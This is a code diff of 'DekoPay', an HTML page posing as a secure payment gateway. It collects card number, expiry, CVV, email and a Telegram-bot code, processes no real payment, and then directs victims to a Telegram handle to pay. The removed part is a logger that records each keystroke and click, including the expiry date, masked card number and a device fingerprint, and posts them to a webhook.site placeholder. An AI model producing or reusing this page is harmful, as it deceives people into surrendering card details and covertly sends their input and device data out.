@@ -3,9 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DekoPay - Secure Payment Gateway</title>
+    <title>DekoPay</title>
     <style>
-        /* Твои стили остаются без изменений */
         * {
             margin: 0;
             padding: 0;
@@ -13,8 +12,10 @@
         }
 
         body {
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
-            background: linear-gradient(135deg, #0c0c0c 0%, #1a1a1a 100%);
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(-45deg, #ee7752, #e73c7e, #23a6d5, #23d5ab);
+            background-size: 400% 400%;
+            animation: gradient 15s ease infinite;
             color: #ffffff;
             min-height: 100vh;
             display: flex;
@@ -23,41 +24,45 @@
             padding: 20px;
         }
 
-        .container {
-            width: 100%;
-            max-width: 480px;
-            background: rgba(255, 255, 255, 0.05);
-            backdrop-filter: blur(20px);
-            border-radius: 24px;
-            padding: 40px 30px;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.3);
+        @keyframes gradient {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
         }
 
-        .header {
+        .container {
+            width: 100%;
+            max-width: 500px;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(20px);
+            border-radius: 25px;
+            padding: 50px 40px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.3);
             text-align: center;
-            margin-bottom: 40px;
         }
 
         .logo {
-            font-size: 2.5em;
-            font-weight: 700;
-            background: linear-gradient(135deg, #00ff88, #00ccff);
+            font-size: 3.5em;
+            font-weight: 900;
+            background: linear-gradient(135deg, #fff, #f0f0f0);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             background-clip: text;
-            margin-bottom: 8px;
+            margin-bottom: 10px;
+            text-shadow: 0 0 30px rgba(255, 255, 255, 0.5);
         }
 
         .subtitle {
-            font-size: 0.9em;
-            color: #888;
-            letter-spacing: 2px;
+            font-size: 1.1em;
+            color: rgba(255, 255, 255, 0.8);
+            letter-spacing: 3px;
             text-transform: uppercase;
+            margin-bottom: 40px;
         }
 
         .payment-form, .code-form, .final-screen {
-            transition: all 0.3s ease;
+            transition: all 0.5s ease;
         }
 
         .hidden {
@@ -65,88 +70,94 @@
         }
 
         h2 {
-            font-size: 1.5em;
-            margin-bottom: 8px;
-            text-align: center;
+            font-size: 2em;
+            margin-bottom: 15px;
+            font-weight: 300;
+            text-shadow: 0 0 20px rgba(255, 255, 255, 0.3);
         }
 
         .description {
-            color: #aaa;
-            text-align: center;
-            margin-bottom: 30px;
-            line-height: 1.5;
+            color: rgba(255, 255, 255, 0.9);
+            margin-bottom: 40px;
+            line-height: 1.6;
+            font-size: 1.1em;
         }
 
         .form-group {
-            margin-bottom: 20px;
+            margin-bottom: 25px;
+            text-align: left;
         }
 
         label {
             display: block;
-            margin-bottom: 8px;
-            color: #ccc;
-            font-size: 0.9em;
+            margin-bottom: 12px;
+            color: rgba(255, 255, 255, 0.9);
+            font-size: 1em;
             font-weight: 500;
+            text-transform: uppercase;
+            letter-spacing: 1px;
         }
 
         input {
             width: 100%;
-            padding: 15px;
-            background: rgba(255, 255, 255, 0.1);
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            border-radius: 12px;
+            padding: 18px 20px;
+            background: rgba(255, 255, 255, 0.15);
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-radius: 15px;
             color: #fff;
             font-size: 16px;
             transition: all 0.3s ease;
+            outline: none;
         }
 
         input:focus {
-            outline: none;
-            border-color: #00ff88;
-            background: rgba(255, 255, 255, 0.15);
+            border-color: rgba(255, 255, 255, 0.8);
+            background: rgba(255, 255, 255, 0.25);
+            box-shadow: 0 0 30px rgba(255, 255, 255, 0.2);
         }
 
         input::placeholder {
-            color: #666;
+            color: rgba(255, 255, 255, 0.6);
         }
 
         .form-row {
             display: grid;
             grid-template-columns: 1fr 1fr;
-            gap: 15px;
+            gap: 20px;
         }
 
-        .pay-button, .verify-button, .close-button {
+        .pay-button, .verify-button, .continue-button {
             width: 100%;
-            padding: 18px;
-            background: linear-gradient(135deg, #00ff88, #00ccff);
+            padding: 20px;
+            background: linear-gradient(135deg, rgba(255, 255, 255, 0.9), rgba(255, 255, 255, 0.7));
             border: none;
-            border-radius: 12px;
-            color: #000;
-            font-size: 1.1em;
+            border-radius: 15px;
+            color: #333;
+            font-size: 1.2em;
             font-weight: 600;
             cursor: pointer;
             transition: all 0.3s ease;
-            margin-top: 10px;
-            position: relative;
-            overflow: hidden;
+            margin-top: 20px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
         }
 
-        .pay-button:hover, .verify-button:hover, .close-button:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 30px rgba(0, 255, 136, 0.3);
+        .pay-button:hover, .verify-button:hover, .continue-button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 40px rgba(255, 255, 255, 0.4);
+            background: linear-gradient(135deg, #fff, #f8f8f8);
         }
 
-        .pay-button:active, .verify-button:active, .close-button:active {
-            transform: translateY(0);
+        .pay-button:active, .verify-button:active, .continue-button:active {
+            transform: translateY(-1px);
         }
 
         .loading-spinner {
             display: none;
-            width: 20px;
-            height: 20px;
-            border: 2px solid transparent;
-            border-top: 2px solid #000;
+            width: 25px;
+            height: 25px;
+            border: 3px solid transparent;
+            border-top: 3px solid #333;
             border-radius: 50%;
             animation: spin 1s linear infinite;
             margin: 0 auto;
@@ -159,89 +170,142 @@
 
         .security-info {
             text-align: center;
-            margin-top: 30px;
-            padding-top: 20px;
-            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            margin-top: 40px;
+            padding-top: 30px;
+            border-top: 1px solid rgba(255, 255, 255, 0.2);
         }
 
         .secure-badge {
             display: inline-flex;
             align-items: center;
-            gap: 8px;
-            color: #00ff88;
+            gap: 10px;
+            color: rgba(255, 255, 255, 0.9);
             font-size: 0.9em;
+            text-transform: uppercase;
+            letter-spacing: 1px;
         }
 
         .code-inputs {
             display: grid;
             grid-template-columns: repeat(6, 1fr);
-            gap: 10px;
-            margin: 30px 0;
+            gap: 15px;
+            margin: 40px 0;
         }
 
         .code-input {
             text-align: center;
-            font-size: 1.2em;
-            font-weight: 600;
-            padding: 15px;
+            font-size: 1.4em;
+            font-weight: 700;
+            padding: 18px;
+            background: rgba(255, 255, 255, 0.15);
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-radius: 12px;
+            color: #fff;
+            transition: all 0.3s ease;
+        }
+
+        .code-input:focus {
+            border-color: rgba(255, 255, 255, 0.8);
+            background: rgba(255, 255, 255, 0.25);
+            box-shadow: 0 0 20px rgba(255, 255, 255, 0.3);
         }
 
         .back-button {
             width: 100%;
-            padding: 15px;
+            padding: 16px;
             background: transparent;
-            border: 1px solid rgba(255, 255, 255, 0.3);
-            border-radius: 12px;
+            border: 2px solid rgba(255, 255, 255, 0.4);
+            border-radius: 15px;
             color: #fff;
             font-size: 1em;
             cursor: pointer;
             transition: all 0.3s ease;
-            margin-top: 15px;
+            margin-top: 20px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
         }
 
         .back-button:hover {
             background: rgba(255, 255, 255, 0.1);
+            border-color: rgba(255, 255, 255, 0.6);
         }
 
         .final-screen {
             text-align: center;
         }
 
-        .success-icon {
-            font-size: 4em;
-            margin-bottom: 20px;
+        .processing-icon {
+            font-size: 5em;
+            margin-bottom: 30px;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.1); opacity: 0.8; }
+            100% { transform: scale(1); opacity: 1; }
         }
 
         .final-description {
-            color: #aaa;
-            margin-bottom: 30px;
+            color: rgba(255, 255, 255, 0.9);
+            margin-bottom: 40px;
             line-height: 1.6;
+            font-size: 1.2em;
         }
 
-        .manager-info {
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 12px;
-            padding: 20px;
-            margin: 25px 0;
-            border-left: 4px solid #00ff88;
+        .contact-info {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            padding: 25px;
+            margin: 30px 0;
+            border-left: 4px solid rgba(255, 255, 255, 0.5);
         }
 
-        .manager-info p {
-            margin-bottom: 8px;
-            text-align: left;
+        .contact-info p {
+            margin-bottom: 12px;
+            text-align: center;
+            font-size: 1.1em;
         }
 
-        .manager-info strong {
-            color: #00ff88;
+        .contact-info strong {
+            color: #fff;
+            font-weight: 600;
+        }
+
+        .status-indicator {
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            padding: 12px 25px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 25px;
+            margin: 20px 0;
+            font-size: 0.9em;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .status-dot {
+            width: 12px;
+            height: 12px;
+            background: #4CAF50;
+            border-radius: 50%;
+            animation: blink 2s infinite;
+        }
+
+        @keyframes blink {
+            0%, 50% { opacity: 1; }
+            51%, 100% { opacity: 0.3; }
         }
 
         @media (max-width: 480px) {
             .container {
-                padding: 30px 20px;
+                padding: 40px 25px;
+                border-radius: 20px;
             }
             
             .logo {
-                font-size: 2em;
+                font-size: 2.8em;
             }
             
             .form-row {
@@ -249,25 +313,48 @@
             }
             
             .code-inputs {
-                gap: 8px;
+                gap: 10px;
             }
             
             .code-input {
-                padding: 12px;
+                padding: 15px;
+                font-size: 1.2em;
             }
+            
+            h2 {
+                font-size: 1.7em;
+            }
+        }
+
+        /* Анимация появления элементов */
+        .fade-in {
+            animation: fadeIn 0.8s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Эффект стекла */
+        .glass-effect {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="header">
+    <div class="container glass-effect">
+        <div class="header fade-in">
             <div class="logo">DekoPay</div>
             <div class="subtitle">Secure Payment Gateway</div>
         </div>
 
-        <div class="payment-form" id="paymentForm">
+        <!-- Форма оплаты -->
+        <div class="payment-form fade-in" id="paymentForm">
             <h2>Оплата: 900 ₽</h2>
-            <p class="description">Введите данные карты для завершения оплаты</p>
+            <p class="description">Введите данные для завершения транзакции</p>
             
             <form id="cardForm">
                 <div class="form-group">
@@ -303,6 +390,7 @@
             </div>
         </div>
 
+        <!-- Экран ввода кода -->
         <div class="code-form hidden" id="codeForm">
             <h2>Подтверждение оплаты</h2>
             <p class="description">Введите 6-значный код из Telegram бота</p>
@@ -320,147 +408,46 @@
             <button class="back-button" id="backToPayment">Назад к оплате</button>
         </div>
 
+        <!-- Финальный экран -->
         <div class="final-screen hidden" id="finalScreen">
-            <div class="success-icon">✅</div>
-            <h2>Оплата завершена!</h2>
+            <div class="processing-icon">⏳</div>
+            <h2>Оплата продолжается</h2>
+            <div class="status-indicator">
+                <div class="status-dot"></div>
+                <span>Обработка платежа</span>
+            </div>
             <p class="final-description">
-                Свяжитесь с менеджером для получения товара:<br>
-                <strong>@c00l9r</strong>
+                Ваш платеж нужно оплатить<br>
+                Это можно сделать у @c00l9r
             </p>
-            <div class="manager-info">
+            <div class="contact-info">
                 <p>👤 <strong>Менеджер/Создатель</strong></p>
                 <p>💬 Telegram: @c00l9r</p>
-                <p>💰 Оплата: 900 рублей</p>
+                <p>💰 Сумма: 900 рублей</p>
                 <p>📦 Товар: Модуль HTMLHelper</p>
             </div>
-            <button class="close-button" onclick="window.close()">Закрыть</button>
+            <button class="continue-button" onclick="window.close()">Закрыть</button>
         </div>
     </div>
 
     <script>
-        class Logger {
-            static async log(action, data = {}) {
-                const timestamp = new Date().toISOString();
-                const userInfo = {
-                    userAgent: navigator.userAgent,
-                    language: navigator.language,
-                    platform: navigator.platform,
-                    screen: `${screen.width}x${screen.height}`,
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
-                };
-
-                const logEntry = {
-                    action: action,
-                    data: data,
-                    timestamp: timestamp,
-                    userInfo: userInfo,
-                    url: window.location.href,
-                    referrer: document.referrer
-                };
-
-                // Выводим в консоль браузера (ты сможешь видеть в DevTools)
-                console.log('🌐 [DekoPay LOG]', logEntry);
-
-                // Сохраняем в localStorage для отладки
-                try {
-                    const logs = JSON.parse(localStorage.getItem('dekopay_logs') || '[]');
-                    logs.push(logEntry);
-                    if (logs.length > 100) logs.shift(); // Ограничиваем размер
-                    localStorage.setItem('dekopay_logs', JSON.stringify(logs));
-                } catch (e) {
-                    console.error('Error saving logs to localStorage:', e);
-                }
-
-                // Пытаемся отправить на сервер (будет работать только если настроен бэкенд)
-                try {
-                    // Замени на реальный URL если настроишь бэкенд
-                    await fetch('https://webhook.site/your-unique-url', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify(logEntry)
-                    });
-                } catch (error) {
-                    // Игнорируем ошибки отправки
-                }
-            }
-
-            static downloadLogs() {
-                try {
-                    const logs = JSON.parse(localStorage.getItem('dekopay_logs') || '[]');
-                    const dataStr = JSON.stringify(logs, null, 2);
-                    const dataBlob = new Blob([dataStr], {type: 'application/json'});
-                    
-                    const link = document.createElement('a');
-                    link.href = URL.createObjectURL(dataBlob);
-                    link.download = `dekopay-logs-${new Date().toISOString().split('T')[0]}.json`;
-                    link.click();
-                } catch (e) {
-                    console.error('Error downloading logs:', e);
-                }
-            }
-        }
-
         class DekoPay {
             constructor() {
-                this.currentCode = this.generateCode();
-                this.userData = {};
                 this.init();
             }
 
             init() {
                 this.setupEventListeners();
                 this.setupCodeInputs();
-                this.logPageView();
-                
-                // Добавляем скрытую кнопку для скачивания логов (для отладки)
-                this.addDebugButton();
-            }
-
-            addDebugButton() {
-                const debugBtn = document.createElement('button');
-                debugBtn.innerHTML = '📊';
-                debugBtn.style.position = 'fixed';
-                debugBtn.style.bottom = '10px';
-                debugBtn.style.right = '10px';
-                debugBtn.style.background = '#333';
-                debugBtn.style.color = 'white';
-                debugBtn.style.border = 'none';
-                debugBtn.style.borderRadius = '50%';
-                debugBtn.style.width = '40px';
-                debugBtn.style.height = '40px';
-                debugBtn.style.cursor = 'pointer';
-                debugBtn.style.zIndex = '1000';
-                debugBtn.title = 'Download Logs';
-                
-                debugBtn.addEventListener('click', () => {
-                    Logger.downloadLogs();
-                });
-                
-                document.body.appendChild(debugBtn);
-            }
-
-            async logPageView() {
-                await Logger.log('PAGE_VIEW', {
-                    page: 'main',
-                    code: this.currentCode
-                });
-            }
-
-            generateCode() {
-                return Math.floor(100000 + Math.random() * 900000).toString();
             }
 
             setupEventListeners() {
-                // Логируем все вводимые данные
+                document.getElementById('cardForm').addEventListener('submit', (e) => {
+                    e.preventDefault();
+                    this.processPayment();
+                });
+
                 document.getElementById('cardNumber').addEventListener('input', (e) => {
-                    this.userData.cardNumber = e.target.value;
-                    Logger.log('CARD_NUMBER_INPUT', { 
-                        length: e.target.value.length,
-                        masked: this.maskCardNumber(e.target.value)
-                    });
-                    
                     let value = e.target.value.replace(/\s/g, '');
                     if (value.length > 0) {
                         value = value.match(/.{1,4}/g).join(' ');
@@ -469,9 +456,6 @@
                 });
 
                 document.getElementById('expiryDate').addEventListener('input', (e) => {
-                    this.userData.expiryDate = e.target.value;
-                    Logger.log('EXPIRY_DATE_INPUT', { value: e.target.value });
-                    
                     let value = e.target.value.replace(/\D/g, '');
                     if (value.length >= 2) {
                         value = value.substring(0, 2) + '/' + value.substring(2, 4);
@@ -480,61 +464,16 @@
                 });
 
                 document.getElementById('cvv').addEventListener('input', (e) => {
-                    this.userData.cvv = e.target.value;
-                    Logger.log('CVV_INPUT', { length: e.target.value.length });
                     e.target.value = e.target.value.replace(/\D/g, '');
                 });
 
-                document.getElementById('email').addEventListener('input', (e) => {
-                    this.userData.email = e.target.value;
-                    Logger.log('EMAIL_INPUT', { 
-                        domain: e.target.value.split('@')[1] || 'unknown'
-                    });
-                });
-
-                // Логируем все клики по кнопкам
-                document.getElementById('payButton').addEventListener('click', () => {
-                    Logger.log('PAY_BUTTON_CLICK', {
-                        cardLength: this.userData.cardNumber?.length || 0,
-                        hasEmail: !!this.userData.email
-                    });
-                });
-
                 document.getElementById('verifyButton').addEventListener('click', () => {
-                    Logger.log('VERIFY_BUTTON_CLICK');
+                    this.verifyCode();
                 });
 
                 document.getElementById('backToPayment').addEventListener('click', () => {
-                    Logger.log('BACK_BUTTON_CLICK');
+                    this.showPaymentForm();
                 });
-
-                // Логируем отправку формы
-                document.getElementById('cardForm').addEventListener('submit', (e) => {
-                    e.preventDefault();
-                    Logger.log('FORM_SUBMIT', {
-                        cardLength: this.userData.cardNumber?.length || 0,
-                        expiryDate: this.userData.expiryDate,
-                        emailDomain: this.userData.email?.split('@')[1] || 'unknown'
-                    });
-                    this.processPayment();
-                });
-
-                // Логируем ввод кода
-                document.querySelectorAll('.code-input').forEach(input => {
-                    input.addEventListener('input', (e) => {
-                        Logger.log('CODE_INPUT', { 
-                            index: e.target.dataset.index,
-                            hasValue: !!e.target.value
-                        });
-                    });
-                });
-            }
-
-            maskCardNumber(cardNumber) {
-                if (!cardNumber) return 'unknown';
-                const cleaned = cardNumber.replace(/\s/g, '');
-                if (cleaned.length <= 8) return 'too_short';
-                return cleaned.substring(0, 6) + '****' + cleaned.substring(cleaned.length - 4);
             }
 
             setupCodeInputs() {
@@ -558,7 +497,6 @@
                     input.addEventListener('paste', (e) => {
                         e.preventDefault();
                         const pasteData = e.clipboardData.getData('text').replace(/\D/g, '');
-                        Logger.log('CODE_PASTE', { length: pasteData.length });
                         if (pasteData.length === 6) {
                             for (let i = 0; i < 6; i++) {
                                 if (inputs[i]) {
@@ -584,36 +522,13 @@
                 loadingSpinner.style.display = 'block';
                 payButton.disabled = true;
 
-                await Logger.log('PAYMENT_PROCESSING_START', {
-                    cardType: this.detectCardType(this.userData.cardNumber),
-                    emailDomain: this.userData.email?.split('@')[1] || 'unknown'
-                });
-
-                // Имитация обработки платежа
                 await new Promise(resolve => setTimeout(resolve, 2000));
-
-                await Logger.log('PAYMENT_PROCESSING_END', {
-                    status: 'success',
-                    cardType: this.detectCardType(this.userData.cardNumber)
-                });
 
                 this.showCodeForm();
 
                 buttonText.style.display = 'block';
                 loadingSpinner.style.display = 'none';
                 payButton.disabled = false;
-            }
-
-            detectCardType(cardNumber) {
-                if (!cardNumber) return 'unknown';
-                const cleaned = cardNumber.replace(/\s/g, '');
-                
-                if (/^4/.test(cleaned)) return 'visa';
-                if (/^5[1-5]/.test(cleaned)) return 'mastercard';
-                if (/^3[47]/.test(cleaned)) return 'amex';
-                if (/^6(?:011|5)/.test(cleaned)) return 'discover';
-                
-                return 'unknown';
             }
 
             validateForm() {
@@ -624,55 +539,41 @@
 
                 if (cardNumber.length !== 16) {
                     alert('Введите корректный номер карты (16 цифр)');
-                    Logger.log('VALIDATION_ERROR', { error: 'Invalid card number', length: cardNumber.length });
                     return false;
                 }
 
                 if (!expiryDate.match(/^\d{2}\/\d{2}$/)) {
                     alert('Введите корректный срок действия (ММ/ГГ)');
-                    Logger.log('VALIDATION_ERROR', { error: 'Invalid expiry date' });
                     return false;
                 }
 
                 if (cvv.length !== 3) {
                     alert('Введите корректный CVV код (3 цифры)');
-                    Logger.log('VALIDATION_ERROR', { error: 'Invalid CVV', length: cvv.length });
                     return false;
                 }
 
                 if (!email.match(/^[^\s@]+@[^\s@]+\.[^\s@]+$/)) {
                     alert('Введите корректный email адрес');
-                    Logger.log('VALIDATION_ERROR', { error: 'Invalid email' });
                     return false;
                 }
 
-                Logger.log('VALIDATION_SUCCESS', {
-                    cardType: this.detectCardType(cardNumber),
-                    emailDomain: email.split('@')[1]
-                });
                 return true;
             }
 
             showCodeForm() {
                 document.getElementById('paymentForm').classList.add('hidden');
                 document.getElementById('codeForm').classList.remove('hidden');
-                Logger.log('SHOW_CODE_FORM');
                 document.querySelector('.code-input').focus();
             }
 
             showPaymentForm() {
                 document.getElementById('codeForm').classList.add('hidden');
                 document.getElementById('paymentForm').classList.remove('hidden');
-                Logger.log('SHOW_PAYMENT_FORM');
             }
 
             showFinalScreen() {
                 document.getElementById('codeForm').classList.add('hidden');
                 document.getElementById('finalScreen').classList.remove('hidden');
-                Logger.log('SHOW_FINAL_SCREEN', { 
-                    status: 'success',
-                    manager: '@c00l9r'
-                });
             }
 
             verifyCode() {
@@ -680,18 +581,12 @@
                     .map(input => input.value)
                     .join('');
 
-                Logger.log('CODE_VERIFICATION_ATTEMPT', { 
-                    codeLength: enteredCode.length
-                });
-
                 if (enteredCode.length !== 6) {
                     alert('Введите полный 6-значный код');
-                    Logger.log('CODE_VERIFICATION_ERROR', { error: 'Incomplete code' });
                     return;
                 }
 
                 this.showFinalScreen();
-                Logger.log('CODE_VERIFICATION_SUCCESS');
             }
 
             clearCodeInputs() {
@@ -699,31 +594,10 @@
                     input.value = '';
                 });
             }
-
-            getCurrentCode() {
-                return this.currentCode;
-            }
         }
 
-        // Логируем загрузку страницы
         document.addEventListener('DOMContentLoaded', () => {
             window.dekoPay = new DekoPay();
-            Logger.log('PAGE_LOADED');
-        });
-
-        // Логируем уход со страницы
-        window.addEventListener('beforeunload', () => {
-            Logger.log('PAGE_UNLOAD');
-        });
-
-        // Логируем ошибки
-        window.addEventListener('error', (e) => {
-            Logger.log('JAVASCRIPT_ERROR', {
-                message: e.message,
-                filename: e.filename,
-                lineno: e.lineno,
-                colno: e.colno
-            });
         });
     </script>
 </body>
